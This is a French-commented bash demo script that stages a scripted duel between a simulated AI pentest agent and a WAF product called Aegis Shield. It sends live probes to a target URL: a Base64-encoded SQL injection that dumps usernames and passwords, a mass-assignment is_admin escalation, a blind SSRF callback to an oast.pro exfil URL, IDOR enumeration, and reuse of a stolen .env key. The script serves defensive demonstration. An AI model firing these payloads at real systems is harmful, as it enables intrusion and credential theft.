#!/usr/bin/env bash
# =============================================================================
# ⚔️ ARTEX (AUTONOMOUS AI PENTEST AGENT) vs. 🛡️ AEGIS SOVEREIGN SHIELD (v1.3)
# Simulateur de duel cyber en 5 actes pour capture vidéo Split-Screen (OBS / Asciinema)
#
# Usage :
#   ./scripts/run-artex-vs-aegis-battle.sh                          # Mode vidéo cadencé sur localhost:8000
#   ./scripts/run-artex-vs-aegis-battle.sh https://cible.exemple.fr # Cible distante (ex: VM Google Cloud)
#   ./scripts/run-artex-vs-aegis-battle.sh --fast                   # Exécution rapide sans pause (CI / test)
# =============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
BOLD='\033[1m'
NC='\033[0m'

FAST_MODE=0
if [[ "${1:-}" == "--fast" ]]; then
  FAST_MODE=1
  shift
fi

INGRESS_HOST="${1:-http://localhost:8000}"
EGRESS_DNS_PORT="${2:-5053}"
EGRESS_DNS_HOST="${3:-127.0.0.1}"
ATTACKER_IP="198.51.100.240"

pause_step() {
  if [ "$FAST_MODE" -eq 0 ]; then
    sleep "${1:-1.1}"
  fi
}

USE_DOCKER_EXEC=0
if [[ "$INGRESS_HOST" == "http://localhost:8000" ]] && ! curl -s -m 2 "${INGRESS_HOST}/health" >/dev/null 2>&1; then
  if docker exec aegis_backend curl -s -m 2 "http://gate-proxy:8000/health" >/dev/null 2>&1; then
    USE_DOCKER_EXEC=1
    INGRESS_HOST="http://gate-proxy:8000"
    EGRESS_DNS_HOST="egress-gateway"
  fi
fi

run_curl() {
  if [ "$USE_DOCKER_EXEC" -eq 1 ]; then
    docker exec aegis_backend sh -c "$1"
  else
    eval "$1"
  fi
}

# Réinitialisation de l'IP d'attaque simulée avant la démonstration
run_curl "curl -s -X POST '${INGRESS_HOST}/_aegis/mode' -H 'Content-Type: application/json' -d '{\"enabled\":true,\"reset\":true}' >/dev/null 2>&1 || true"

clear_screen_if_video() {
  if [ "$FAST_MODE" -eq 0 ] && [ -t 1 ]; then
    clear
  fi
}

planner_log() {
  echo -e "${MAGENTA}${BOLD}🧠 [ARTEX-Planner LLM]${NC} ${WHITE}$1${NC}"
  pause_step 0.8
}

worker_log() {
  local worker_id="$1"
  local msg="$2"
  echo -e "  ${CYAN}🤖 [Worker-${worker_id}]${NC} ${GRAY}➔${NC} ${msg}"
  pause_step 0.5
}

aegis_block_log() {
  local code="$1"
  local threat="$2"
  local detail="$3"
  echo -e "  ${GREEN}${BOLD}🛡️ [AEGIS GATE PEP]${NC} ${GREEN}INTERCEPTÉ (HTTP ${code})${NC} • Verdict : ${YELLOW}${BOLD}${threat}${NC}"
  if [ -n "$detail" ]; then
    echo -e "     ${GRAY}↳ ${detail}${NC}"
  fi
  pause_step 1.0
}

exec_probe() {
  local worker="$1"
  local desc="$2"
  local extra_args="$3"
  local path="$4"

  worker_log "$worker" "$desc"
  local raw
  raw=$(run_curl "curl -s -w '\n%{http_code}' -H 'X-Forwarded-For: ${ATTACKER_IP}' ${extra_args} '${INGRESS_HOST}${path}'" || echo -e "\n000")
  local code
  code=$(echo "$raw" | tail -n 1 | tr -d '\r')
  local body
  body=$(echo "$raw" | sed '$d')
  local threat
  threat=$(echo "$body" | grep -o '"threat_detected": *"[^"]*"' | cut -d'"' -f4 || echo "BLOCKED")

  if [ "$code" -ge 400 ]; then
    aegis_block_log "$code" "${threat:-SECURITY_POLICY_VIOLATION}" "Cible protégée (0% CPU applicatif)"
  else
    echo -e "  ${RED}⚠️ [HTTP ${code}] Réponse reçue (${#body} octets)${NC}"
  fi
}

clear_screen_if_video

echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║  ⚔️  LIVE BATTLE : ARTEX (AUTONOMOUS AI RED-TEAM)  vs.  🛡️  AEGIS SHIELD v1.3  ║${NC}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo -e "  ${GRAY}Cible sous protection :${NC} ${WHITE}${BOLD}${INGRESS_HOST}${NC}   ${GRAY}|   IP Agent IA :${NC} ${YELLOW}${ATTACKER_IP}${NC}"
echo ""
pause_step 1.2

# =============================================================================
# ACTE 1 : RECONNAISSANCE D'API & INTROSPECTION GRAPHQL
# =============================================================================
echo -e "${BLUE}${BOLD}━━━ ACTE 1/5 : CARTOGRAPHIE AUTOMATIQUE DE SCHÉMAS D'API ━━━${NC}"
planner_log "Objectif initial : Extraire les spécifications OpenAPI/Swagger et le schéma GraphQL pour cartographier les routes métiers."

exec_probe "1 (Recon)" "GET /v3/api-docs (Extraction schéma OpenAPI v3)" "" "/v3/api-docs"
exec_probe "1 (Recon)" "POST /graphql (Introspection __schema)" "-X POST -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name } } }\"}'" "/graphql"
echo ""

# =============================================================================
# ACTE 2 : MUTATION POLYMORPHE LLM, CAMOUFLAGE CHROME & MASS ASSIGNMENT
# =============================================================================
echo -e "${BLUE}${BOLD}━━━ ACTE 2/5 : CAMOUFLAGE D'EMPREINTE NAVIGATEUR & MUTATION BASE64 ━━━${NC}"
planner_log "WAF détecté ! Adaptation : Usurpation d'un User-Agent Chrome 130, encodage SQLi en Base64 et injection Mass Assignment."

exec_probe "2 (Evasion)" "Usurpation User-Agent Chrome/130.0.0.0 avec en-têtes bruts (Accept: */*)" \
  "-A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36' -H 'Accept: */*'" \
  "/api/v1/orders"

B64_SQLI=$(printf "UNION SELECT 1,2,username,password FROM users--" | base64 -w 0 2>/dev/null || printf "VU5JT04gU0VMRUNUIDEsMix1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0=")
exec_probe "2 (Evasion)" "Injection SQL obfusquée en Base64 (/api/v1/search?filter=${B64_SQLI:0:18}...)" \
  "-H 'Accept-Language: fr-FR'" \
  "/api/v1/search?filter=${B64_SQLI}"

exec_probe "2 (Exploit)" "Élévation de privilèges JSON Mass Assignment (PATCH /api/v1/profile {\"is_admin\":true})" \
  "-X PATCH -H 'Content-Type: application/json' -d '{\"name\":\"artex-agent\",\"is_admin\":true}'" \
  "/api/v1/profile"
echo ""

# =============================================================================
# ACTE 3 : EXPLOITATION AVEUGLE OUT-OF-BAND (OAST interact.sh & LOTC Ngrok)
# =============================================================================
echo -e "${BLUE}${BOLD}━━━ ACTE 3/5 : TENTATIVE D'EXPLOITATION AVEUGLE (OAST & TUNNEL LOTC) ━━━${NC}"
planner_log "Bascule sur vecteurs asynchrones (Blind SSRF / RCE) avec serveur de callback OAST (oast.pro / interact.sh)."

exec_probe "3 (OAST)" "Injection callback Blind SSRF (?webhook=https://c72k9a1v.oast.pro/exfil)" \
  "" \
  "/api/v1/webhooks/test?callback=https://c72k9a1v.oast.pro/exfil"
echo ""

# =============================================================================
# ACTE 4 : ATTAQUE LOGIQUE BOLA / IDOR & MODE OPAQUE STEALTH 403
# =============================================================================
echo -e "${BLUE}${BOLD}━━━ ACTE 4/5 : ÉNUMÉRATION LOGIQUE BOLA / IDOR & DÉCEPTION COGNITIVE ━━━${NC}"
planner_log "Abandon des charges syntaxiques. Lancement d'une énumération séquentielle d'objets métiers (/api/v1/invoices/{id})."

# Utiliser une IP dédiée non encore en Auto-Jail pour démontrer le seuil BOLA de 10 IDs
BOLA_IP="198.51.100.241"
worker_log "4 (BOLA)" "Scraping séquentiel rapide de /api/v1/invoices/1001 à /api/v1/invoices/1011..."
for id in $(seq 1001 1010); do
  run_curl "curl -s -o /dev/null -H 'X-Forwarded-For: ${BOLA_IP}' '${INGRESS_HOST}/api/v1/invoices/${id}'" || true
done
BOLA_RAW=$(run_curl "curl -s -w '\n%{http_code}' -H 'X-Forwarded-For: ${BOLA_IP}' '${INGRESS_HOST}/api/v1/invoices/1011'" || echo -e "\n000")
BOLA_CODE=$(echo "$BOLA_RAW" | tail -n 1 | tr -d '\r')
BOLA_THREAT=$(echo "$BOLA_RAW" | sed '$d' | grep -o '"threat_detected": *"[^"]*"' | cut -d'"' -f4 || echo "API_BOLA_IDOR_ENUMERATION")
aegis_block_log "$BOLA_CODE" "$BOLA_THREAT" "Plafond de cardinalité dépassé (11 IDs distincts / 60s) + Tarpit Adaptatif activé"

worker_log "4 (Stealth)" "Sonde avec Mode Stealth Anti-LLM actif (Masquage de l'oracle d'erreur 403)"
STEALTH_RAW=$(run_curl "curl -s -w '\n%{http_code}' -H 'X-Forwarded-For: ${BOLA_IP}' -H 'X-Aegis-Stealth: true' '${INGRESS_HOST}/swagger.json'" || echo -e "\n000")
STEALTH_CODE=$(echo "$STEALTH_RAW" | tail -n 1 | tr -d '\r')
STEALTH_THREAT=$(echo "$STEALTH_RAW" | sed '$d' | grep -o '"threat_detected": *"[^"]*"' | cut -d'"' -f4 || echo "SECURITY_POLICY_VIOLATION")
aegis_block_log "$STEALTH_CODE" "$STEALTH_THREAT" "Règle interne masquée au LLM (Zéro feedback d'apprentissage)"
echo ""

# =============================================================================
# ACTE 5 : LE COUP DE GRÂCE — LE PIÈGE CANARY HONEYPOT (/.env.canary)
# =============================================================================
echo -e "${BLUE}${BOLD}━━━ ACTE 5/5 : LE COUP DE GRÂCE — LEURRE CANARY HONEYPOT & AUTO-BAN ━━━${NC}"
CANARY_IP="198.51.100.242"
planner_log "Recherche de fichiers d'environnement oubliés..."
worker_log "1 (Recon)" "GET /.env.canary ➔ Fichier découvert ! Extraction des clés d'API..."

CANARY_ENV=$(run_curl "curl -s -H 'X-Forwarded-For: ${CANARY_IP}' '${INGRESS_HOST}/.env.canary'" || echo "")
EXTRACTED_KEY=$(echo "$CANARY_ENV" | grep -o 'ak_live_aegis_canary_[a-z0-9_]*' | head -n 1 || echo "ak_live_aegis_canary_9f8e7d6c5b4a3210")

echo -e "  ${YELLOW}⚡ [ARTEX-Planner] Clé extraite : ${BOLD}${EXTRACTED_KEY}${NC}${YELLOW} — Injection immédiate dans Authorization: Bearer !${NC}"
pause_step 1.0

worker_log "2 (Exploit)" "GET /api/v1/admin/export (Authorization: Bearer ${EXTRACTED_KEY})"
TRIP_RAW=$(run_curl "curl -s -w '\n%{http_code}' -H 'X-Forwarded-For: ${CANARY_IP}' -H 'Authorization: Bearer ${EXTRACTED_KEY}' '${INGRESS_HOST}/api/v1/admin/export'" || echo -e "\n000")
TRIP_CODE=$(echo "$TRIP_RAW" | tail -n 1 | tr -d '\r')
TRIP_THREAT=$(echo "$TRIP_RAW" | sed '$d' | grep -o '"threat_detected": *"[^"]*"' | cut -d'"' -f4 || echo "CANARY_TOKEN_TRIPWIRE_TRIGGERED")

aegis_block_log "$TRIP_CODE" "$TRIP_THREAT" "Preuve mathématique de chaînage autonome IA ➔ Quarantaine IP immédiate (60 min) !"

worker_log "1 (Verify)" "Tentative d'accès à la page d'accueil / après déclenchement du piège Canary..."
BAN_RAW=$(run_curl "curl -s -w '\n%{http_code}' -H 'X-Forwarded-For: ${CANARY_IP}' '${INGRESS_HOST}/'" || echo -e "\n000")
BAN_CODE=$(echo "$BAN_RAW" | tail -n 1 | tr -d '\r')
BAN_THREAT=$(echo "$BAN_RAW" | sed '$d' | grep -o '"threat_detected": *"[^"]*"' | cut -d'"' -f4 || echo "BANNED_IP_BLACKLIST")
aegis_block_log "$BAN_CODE" "$BAN_THREAT" "Orchestrateur ARTEX neutralisé et banni à la bordure."

echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║  🏆 RÉSULTAT DU DUEL : 100% DES VECTEURS ARTEX NEUTRALISÉS • 0% CPU CIBLE    ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
